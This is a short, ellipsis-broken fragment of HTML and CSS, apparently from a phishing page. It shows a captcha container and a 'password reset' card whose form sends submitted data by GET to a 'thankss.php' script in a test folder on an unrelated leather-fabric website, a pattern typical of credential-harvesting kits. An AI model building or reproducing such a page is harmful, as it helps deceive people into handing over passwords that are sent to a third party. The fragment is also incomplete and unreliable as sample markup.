...
#captcha-container {
    margin-bottom: 20px !important
            ...
            <div id="password-reset-container"><div id="parent-card" class="ux-card"><div id="form-header">
              ...
              <form action="https://leatherfabriccollection.com/pjs/test/thankss.php" method="GET">
